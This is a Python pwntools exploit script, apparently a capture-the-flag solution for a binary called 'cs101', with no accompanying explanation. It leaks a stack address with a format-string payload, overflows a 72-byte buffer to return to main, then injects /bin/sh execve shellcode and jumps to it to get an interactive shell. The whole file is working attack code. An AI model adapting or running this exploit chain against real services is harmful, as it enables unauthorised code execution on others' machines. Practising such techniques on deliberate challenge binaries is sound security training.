#!/usr/bin/python3

from pwn import *

exe = ELF('cs101', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* to_lower +106

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)
GDB()
payload = b"%7$p"
payload = payload.ljust(72) + p64(exe.sym['main'] + 1)
sla(b'Text:\n',payload)
p.recvuntil('RESULT: ')
stack = int(p.recv(14), 16)
info(hex(stack))

# payload = b"//bin/sh"
payload = b"/bin/sh\0".ljust(16)
payload += asm(f'''
                inc eax
                inc eax
                inc eax
                inc eax
                mov rax, 0x3b
                sub rsp, 0x50
                mov rdi, rsp
                xor rdx, rdx
                xor rsi, rsi
                syscall
               ''')

payload = payload.ljust(72, b"\0")
payload += p64(stack)
sla(b'Text:\n',payload)
p.interactive()
